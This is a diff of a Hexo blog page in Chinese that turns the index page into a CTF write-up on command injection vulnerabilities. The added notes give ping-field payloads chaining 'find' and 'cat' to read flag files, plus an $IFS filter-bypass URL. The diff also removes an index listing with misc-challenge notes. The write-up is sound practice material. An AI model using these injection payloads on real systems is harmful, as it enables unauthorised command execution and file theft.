@@ -4,7 +4,7 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="theme-color" content=#58b77a>
-  <title>Welcome eeknight.top</title>
+  <title>命令执行漏洞 | Welcome eeknight.top</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="author" content="eeknight">
   <meta name="keywords" content="">
@@ -62,30 +62,25 @@
   <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
 <meta name="generator" content="Hexo 5.1.1"></head>
 <body>
+<div class="single">
+
 <div id="page">
-
-<div id="lx-aside" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/cover.jpeg)">
+<div id="lx-aside" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/post_cover.jpeg)" data-stellar-background-ratio="0.5">
   <div class="overlay">
-  <div class="featured">
+  <div class="page-title">
     <div class="avatar"><a href="/"><img src="/images/avatar.jpeg"></a></div>
-    <span>eeknight</span>
-    <h1>Welcome eeknight.top</h1>
-    
-    
-
-    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1330348068&auto=1&height=66"></iframe>
-  </div>
-  </div>
+    <span>2020-09-20</span>
+    <h2>命令执行漏洞</h2>
+    <div class="tags"><i class="fa fa-tag"></i><a class="tag-none-link" href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">知识点</a></div>
+    </div>
+</div>
 </div>
 
 <div id="lx-main-content">
   <div class="lx-post">
-
-  <div class="lx-entry padding">
-    <div>
-      <h2 class="title"><a href="/2020/09/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">命令执行漏洞</a></h2>
-      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2020-09-20</span>
-      <p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>ping直接输入地址并执行自己想要的命令</p>
+    <div class="lx-entry padding">
+      <div>
+        <h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>ping直接输入地址并执行自己想要的命令</p>
 <p>有index.php可以试试</p>
 <p>访问成功，在试试寻找“.txt”文件，输入命令 127.0.0.1 &amp;&amp;find / -name “*.txt”</p>
 <p>找到flag文件了，用cat命令抓一下：127.0.0.1 &amp;&amp; cat /home/flag.txt</p>
@@ -243,106 +238,41 @@
 <p>但是在这里$IFS不可以 可能是与后面的冲突了</p>
 <p>flag用拼接语句去绕过。</p>
 <p>最后的样子：<a target="_blank" rel="noopener" href="http://34d0deb0-665e-4c66-a71e-6969b3296102.node3.buuoj.cn/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php">http://34d0deb0-665e-4c66-a71e-6969b3296102.node3.buuoj.cn/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</a></p>
-</p>
-      <div class="post-button"><a class="btn" href="/2020/09/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
+
+      </div>
     </div>
   </div>
-  <div class="lx-entry padding">
-    <div>
-      <h2 class="title"><a href="/2020/09/13/hello-world/">Hello World</a></h2>
-      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2020-09-13</span>
-      <p><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+</div>
+<div class="lx-navigation">
+	<div class="lx-cover prev lx-cover-sm" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/footer-l.jpeg)">
+		<div class="overlay"></div>
+		<a class="copy" href="#">
+			<div class="display-t">
+				<div class="display-tc">
+					<div>
+						<span>Next</span>
+						<h3>No newer post</h3>
+					</div>
+				</div>
+			</div>
+		</a>
+	</div>
+        <div class="lx-cover next lx-cover-sm" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/footer-r.jpeg)">
+		<div class="overlay"></div>
+		<a class="copy" href="/2020/09/13/hello-world/">
+			<div class="display-t">
+				<div class="display-tc">
+					<div>
+						<span>Prev</span>
+						<h3>Hello W...</h3>
+					</div>
+				</div>
+			</div>
+		</a>
+	</div>
+</div>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-</p>
-      <div class="post-button"><a class="btn" href="/2020/09/13/hello-world/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
-    </div>
-  </div>
-  <div class="lx-entry padding">
-    <div>
-      <h2 class="title"><a href="/2020/09/13/buuctf-%E6%9D%82%E9%A1%B91/">BUUCTF-杂项</a></h2>
-      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2020-09-13</span>
-      <p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>[TOC]</p>
-<h3 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h3><p>打开后下载文件key.exe</p>
-<p>放到010Editor.exe里面可以看到一段文本</p>
-<p>由于前面是image/jpg 和base64加密 就直接去网上解密并弄成图片形式</p>
-<p>网站：<a target="_blank" rel="noopener" href="https://the-x.cn/base64/%EF%BC%88%E6%B3%A8%E6%84%8F%E8%A6%81%E6%8A%8A%E5%89%8D%E9%9D%A2%E7%9A%84data:image/jpg;base64,%E8%BF%99%E4%B8%80%E6%AE%B5%E5%8E%BB%E6%8E%89%E6%89%8D%E5%8F%AF%E4%BB%A5%E7%BC%96%E8%AF%91%EF%BC%89">https://the-x.cn/base64/（注意要把前面的data:image/jpg;base64,这一段去掉才可以编译）</a></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDEDFCPDCCOHAGOGH" alt="2.png"></p>
-<p>得到一个二维码 扫完就有flag</p>
-<h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDEDGCPDBCOHAGOGH" alt="1.png"></p>
-<p>这里要用到wireshark这个工具–虚拟机上有</p>
-<p>下载后打开看到一堆东西</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDEDHCPDCCOHAGOGH" alt="2.png"></p>
-<p>根据提示直接过滤出POST包</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDEDICPDDCOHAGOGH" alt="3.png"></p>
-<p>找到flag–value里面的数据就是flag</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDEDJCPDECOHAGOGH" alt="4.png"></p>
-<h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？ 注意：得到的 flag 请包上 flag{} 提交</p>
-<p>下载文件</p>
-<p>用wireshark看</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDFDACPDBCOHAGOGH" alt="1.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDFDDCPDCCOHAGOGH" alt="2.png"></p>
-<h3 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h3><p>下载后直接丢到wireshark里面 </p>
-<p>看第一个的追踪流直接出flag</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDIDHCPDBCOHAGOGH" alt="1.png"></p>
-<h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>下载后是这个图片</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDIDICPDBCOHAGOGH" alt="1.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDIDJCPDDCOHAGOGH" alt="3.png"></p>
-<p>看到pk 用zip去解压</p>
-<p>解压后丢进010editor</p>
-<p>题目说的是hctf 所以去找hctf</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDJDACPDGCOHAGOGH" alt="6.png"></p>
-<h3 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h3><p>下载后是一张图片 </p>
-<p>丢进010里面  看到后面有101010这些二进制很可疑</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDJDCCPDGCOHAGOGH" alt="6.png"></p>
-<p>去这个网站解密<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/jinzhi.html">http://ctf.ssleye.com/jinzhi.html</a></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDJDECPDHCOHAGOGH" alt="7.png"></p>
-<p>得到的结果加上flag{koekj3s}</p>
-<h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDFDJDGCPDBCOHAGOGH" alt="1.png"></p>
-<p>有两个东西 zip是加密文件 ，应该是要用jpg去找到密码</p>
-<p>在图片下面有黑点 （盲文）</p>
-<p>解密后是kmdonowg</p>
-<p>里面是音频</p>
-<p>用Audacity打开</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDDDGCPDGCOHAGOGH" alt="6.png"></p>
-<p>看出来是摩斯密码</p>
-<p>-.-. - ..-. .– .–. . .. —– —.. …– ..— ..–.. ..— …– -.. –..</p>
-<p>去解密得到的可能是大写字母 最后要改一下</p>
-<p> flag{wpei08732?23dz}</p>
-<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDDDICPDBCOHAGOGH" alt="1.png"></p>
-<p>看上去没什么东西 ，可能长度有点问题，尝试去修改一下，改成长宽一样就出来falg</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDEDACPDDCOHAGOGH" alt="3.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDDDJCPDCCOHAGOGH" alt="2.png"></p>
-<h3 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h3><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDEDCCPDBCOHAGOGH" alt="1.png"></p>
-<p>破解rar 因为是4为纯数字 直接暴力破解</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDEDDCPDCCOHAGOGH" alt="2.png"></p>
-<p>打开文件，看到这个奇奇怪怪的东西，想去破解他</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDEDECPDDCOHAGOGH" alt="3.png"></p>
-<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook%E5%8E%BB%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%A7%A3%E5%AF%86">https://www.splitbrain.org/services/ook去这个网站就可以解密</a></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDEDFCPDECOHAGOGH" alt="4.png"></p>
-<h3 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h3><p>打开是一个音频</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDEDGCPDBCOHAGOGH" alt="1.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDEDICPDCCOHAGOGH" alt="2.png"></p>
-<p>….. -… -.-. —-. ..— ….. -…. ….- —-. -.-. -… —– .—- —.. —.. ..-. ….. ..— . -…. .—- –… -.. –… —– —-. ..— —-. .—- —-. .—- -.-.</p>
-<p>弄出了摩斯密码去解密，得到下面的结果加个falg{}就可以</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDHDGDEDHCPDDCOHAGOGH" alt="3.png"></p>
-</p>
-      <div class="post-button"><a class="btn" href="/2020/09/13/buuctf-%E6%9D%82%E9%A1%B91/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
-    </div>
-  </div>
-
-
-
+</div>
 
 <footer>
   <div>
@@ -350,8 +280,6 @@
   </div>
 </footer>
 
-  </div>
-</div>
 </div>
 
 <button class="hamburger hamburger--arrow-r" type="button">
